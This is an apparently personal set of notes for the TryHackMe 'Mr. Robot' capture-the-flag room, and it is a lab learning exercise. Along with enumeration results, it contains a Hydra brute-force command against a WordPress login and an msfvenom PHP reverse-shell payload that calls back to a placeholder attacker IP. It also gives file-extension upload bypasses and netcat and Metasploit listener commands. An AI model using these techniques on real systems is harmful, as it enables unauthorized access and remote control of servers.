
# 🕵️ Mr. Robot CTF – TryHackMe

**Target:** `robot.thm`  
**Goal:** Capture all 3 keys

---

## 📡 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sC -sV -p- -oN scans/nmap.txt robot.thm
````

| Port | Service          | Version   |
| ---- | ---------------- | --------- |
| 22   | OpenSSH          | 8.2p1     |
| 80   | Apache httpd     | (default) |
| 443  | Apache httpd SSL | (default) |

---

### 🧭 Gobuster Results

* `/robots.txt`

  * `fsocity.dic` → wordlist
  * `key-1-of-3.txt` → captured ✅
* `/fsocity.dic` → used for brute-force, deduped
* `/intro` → WebM video (cosmetic)
* `/login`, `/wp-admin/` → WordPress login/admin
* `/wp-content/` → potential shell upload location
* `/wp-config` → not exposed
* `/readme`, `/license` → WordPress indicators

---

### 🔐 WordPress Discovery

* WordPress version: **4.3.1** (via wpscan/readme)
* Media upload feature is active
* Admin login page confirmed at `/wp-login.php`

---

## 🗝️ Key Progress

| Key        | Status | Hash/Info                          |
| ---------- | ------ | ---------------------------------- |
| Key 1 of 3 | ✅      | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 of 3 | ⬜      | —                                  |
| Key 3 of 3 | ⬜      | —                                  |

---

## 🧪 Credential Brute-Force

### 📂 Wordlist Cleanup

```bash
sort -u fsocity.dic > fsocity-uniq.txt
```

### 🔓 Hydra Attack

**Initial attempt (false positives):**

```bash
hydra -l elliot -P fsocity-uniq.txt robot.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Dashboard"
```

**Refined with fail-string:**

```bash
hydra -l elliot -P fsocity-uniq.txt robot.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username" -o scans/hydra-login.txt
```

✅ **Valid credentials found:**

* **Username:** `elliot`
* **Password:** `ER28-0652`

---

## 🧰 Exploitation – Media Upload Reverse Shell

### 🎯 Goal

Upload a PHP reverse shell via WordPress media panel.

---

### 🧭 Recon

* Logged in at `/wp-admin/` as `elliot`
* Navigated to **Media → Add New**
* Uploading `.php` directly blocked

**Bypass attempts:**

* `shell.php.jpg`
* `shell.php.png`
* `shell.phtml`
* (Plan to try MIME spoofing via Burp if needed)

---

### 🧰 Payload Creation

```bash
msfvenom -p php/reverse_php LHOST=<your_ip> LPORT=4444 -f raw > shell.php
mv shell.php shell.php.jpg
```

*Alternatively:* `php-reverse-shell.php` (Pentestmonkey)

---

### ☁️ Upload & Path Check

* Upload through Media interface
* Expected path:
  `/wp-content/uploads/YYYY/MM/shell.php.jpg`

---

### 🎧 Listener Setup

```bash
nc -lvnp 4444
```

*Metasploit alternative:*

```bash
use exploit/multi/handler
set PAYLOAD php/reverse_php
set LHOST <your_ip>
set LPORT 4444
run
```

---

### 🧠 Observations

* Login failure pattern was clean for brute force
* WP appears secure unless logged in
* Next challenge is triggering the shell

---

## 🔜 Next Steps

* [ ] Attempt to trigger uploaded shell
* [ ] If blocked, test MIME spoofing via Burp
* [ ] Explore alternative RCE (theme editor, plugin upload)
* [ ] Upon success: stabilize shell and begin local enumeration
* [ ] Search for Key 2 and privilege escalation vectors

---

🗃️ *This file contains secrets and is excluded via `.gitignore`*



